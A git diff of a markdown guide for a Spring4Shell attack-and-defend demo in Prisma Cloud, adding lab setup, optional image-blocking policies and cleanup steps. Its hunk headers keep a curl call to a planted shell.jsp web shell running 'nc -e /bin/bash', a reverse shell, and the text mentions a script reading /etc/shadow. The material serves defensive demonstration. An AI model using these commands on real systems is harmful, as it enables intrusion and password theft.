@@ -24,6 +24,8 @@ Do all of the following steps in advance of the demo
 Refer to Internal Spring4Shell Docs at this time until can rewrite for sharing. 
 
 - Complete all initial setup steps and Steps 1 & 2 of the 'Perform Attack Steps' and before runing the exploit script in Step 3.
+    - Run `bash start-lab.sh` script and a select choice 3 "Spring4Shell Lab" and provide Access
+Key ID, and Secret Access Key
 - Copy all the commands in the following steps in a notepad and pre-enter the Target-IP address.  This will save time in demo.
 - Login to Prisma Cloud and Initiate both:
     - (Optional, noting that we only scan Hosts at this time, so will only get results for the Host and see error for container) Agentless Scan - Monitor > Vulnerabilities > Host > Scan Agentless
@@ -115,11 +117,16 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
     - Edit the Host WAAS Rule to Prevent
     - Re-run attack and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script
     - Show in Primsa Cloud the event was Blocked/Prevented
-4. Prevent Container with Critical Vulnerabilities from even running
+4. OPTIONAL - Prevent Container with Critical Vulnerabilities from even running
     - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed**
     - In the spring4shell-ubuntu terminal, kill the current container
         - Get the container ID of **vuln_app_app** `docker ps`
         - `docker kill <ID>`
+    - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
+    - You should see a message that Image is blocked by your policy.
+ 5. OPTIONAL - Prevent Running Container not from Trusted Registry/Repo/Image
+    - Navigate to **Compute > Defend > Compliance > Trusted Images**
+    - Enable your policy
     - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
     - You should see a message that Image is blocked by your policy.
 
@@ -130,18 +137,13 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
 - TODO - IMPROVE THIS STATEMENT/DETAIL - Given the statistics (referring to the NIST NVD slide stats), on avg. attackers know an explooit ## of days in advance of companies being able to actually patch against a particaulr threat.
 
 
-## Future - Build out connection AWS registry, Github repo, full workflow.
-To Do's
-- Create repo with Dockerfile and app files
-- SYnc up with Prisma Cloud
-- Add CI tools to push to ECR
-- Setup Scan of Repos/Registries
-- Setup to be able to pull images from registry to vulnerable instance
+## Additional Bonus - Integrate Demo with Shift Left Capabilities
 
 ## Cleanup
 1. Disable Host WAAS rule
 2. Change Runtime Container Policy, Processes from Prevent to Alert
-3. Exit SSH sessions and run the `bash destroy-lab.sh` script
+3. Disable other Rules you used (i.e. Vulnerabilities, Compliance, Trusted Images)
+4. Exit SSH sessions and run the `bash destroy-lab.sh` script
 
 
 ## Other Notes
